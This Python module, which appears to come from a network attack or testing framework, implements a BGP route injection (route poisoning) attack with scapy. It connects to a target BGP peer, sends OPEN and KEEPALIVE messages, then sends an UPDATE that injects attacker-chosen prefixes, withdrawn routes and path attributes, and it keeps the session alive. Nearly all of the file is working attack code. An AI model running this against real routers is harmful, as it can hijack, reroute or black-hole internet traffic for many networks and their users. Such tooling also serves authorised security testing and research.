from random import randint
from time import sleep
from scapy.sendrecv import send
from scapy.contrib.bgp import *
from scapy.supersocket import StreamSocket
from scapy.all import Raw

from libs.aux_funcs import type_wrapper, attack_type, attack_cat, attack_layer



def _BGP_session_establish(update_info:list, raw_info):
    # Variable assignment
    asn = raw_info['asn']
    neighbor_ip = raw_info['target_ip']
    nlri = update_info[2]
    path_attr = update_info[1]
    withdrawn_rts = update_info[0]
    dest_port = raw_info['dest_port']
    bgp_id = raw_info['bgp_id']

    # Create socket, perform TCP handshake
    s = socket.socket()
    s.connect((neighbor_ip,dest_port))

    # Transform socket to StreamSocket
    ss = StreamSocket(s, Raw)

    # Send BGP OPEN message
    ss.sr1(BGPHeader(type=1)/BGPOpen(my_as=asn, hold_time=180, bgp_id=bgp_id))
    sleep(1)

    # Send KEEPALIVE
    ss.sr1(BGPHeader(type=4))
    sleep(1)

    # Send UPDATE
    ss.sr1(BGPHeader(type=2)/BGPUpdate(withdrawn_routes=withdrawn_rts, path_attr=path_attr, nlri=nlri))
    sleep(2)

    # Loop send KEEPALIVE every 60 seconds
    try:
        while(True):
            ss.sr1(BGPHeader(type=4))
            sleep(60)
    except KeyboardInterrupt:
        print("Stopping ...")
        return


@type_wrapper(name="BGP Injection", type=attack_type.RoutePoisoning, category = attack_cat.Attack, layer = attack_layer.L3_BGP, arg_list=[])
def BGP_route_injection(args:dict):

    """Perfoms a BGP route injection attack. Establishes a BGP session with the target and injects imported information"""

    bgp_path_attr = _BGP_parse_path_attr(args['bgp_info']['bgp']['path_attributes'])
    bgp_wdrawn_routes = _BGP_parse_nlri(args['bgp_info']['bgp']['withdrawn_routes'])
    bgp_nlri = _BGP_parse_nlri(args['bgp_info']['bgp']['nlri'])

    _BGP_session_establish([bgp_wdrawn_routes,bgp_path_attr,bgp_nlri], args['bgp_info']['bgp'])

    return args
    
    




def _BGP_parse_path_attr(raw_attr):
    path_at = []

    for rpa in raw_attr:
        type_code = rpa['type']
        pa = BGPPathAttr(type_flags=rpa['flags'], type_code=type_code)

        if type_code == 1:
            # ORIGIN
            pa.attribute = BGPPAOrigin(origin = rpa['attribute'])

        elif type_code == 2:
            # AS_PATH
            pa.attribute = BGPPAASPath(segments = [BGPPAASPath.ASPathSegment(segment_type=rpa['seg_type'],segment_length=rpa['seg_len'],segment_value=rpa['seg_val'])])

        elif type_code == 3: 
            # NEXT_HOP
            pa.attribute = BGPPANextHop(next_hop=rpa['next_hop'])

        elif type_code == 4:
            # Multi Exit Discriminator
            pa.attribute = BGPPAMultiExitDisc(med=rpa['med'])

        else:
            #TODO add other attributes
            pass

        path_at.append(pa)

    return path_at


def _BGP_parse_nlri(raw_nlri):
    nlri = []

    for raw_prefix in raw_nlri:
        prefix = BGPNLRI_IPv4(prefix = raw_prefix['prefix'])
        nlri.append(prefix)

    return nlri
